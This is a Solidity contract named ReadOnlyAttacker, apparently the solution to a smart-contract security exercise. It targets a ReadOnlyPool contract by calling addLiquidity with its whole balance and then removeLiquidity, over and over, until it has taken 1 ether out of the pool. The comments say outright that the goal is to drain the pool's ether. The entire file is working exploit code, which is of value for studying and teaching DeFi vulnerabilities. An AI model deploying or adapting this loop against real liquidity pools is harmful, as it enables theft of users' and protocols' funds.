pragma solidity 0.8.15;

import {ReadOnlyPool} from  "../ReadOnly.sol";
 
contract ReadOnlyAttacker {

    ReadOnlyPool _readOnlyContract;

    function manipulateReadOnlyPoolPrice(address readOnlyAddress) payable external{

        _readOnlyContract = ReadOnlyPool(readOnlyAddress);

        // Execpt the 0.2 ether as the gas fee, let  all the lefts ether as msg.value when calling addLiquidity() and removeLiquidity(). 
        // Repeat call the logic until the msg.sender's eth increased 1 ether 

        // Make this contract has 1.8 ether,each time addLiquidity taking all this contract's eth balance then removeLiquidity.
        // Repeat call the logic until this contract's eth balance achieve to 2.8 ethers, which means the  ReadOnlyPool's eth will decrease 1 eth.
        while(address(this).balance < 2.8 ether){
            _readOnlyContract.addLiquidity{value:address(this).balance}();
            _readOnlyContract.removeLiquidity();
        }
    }

     receive() external payable {
       
    }
}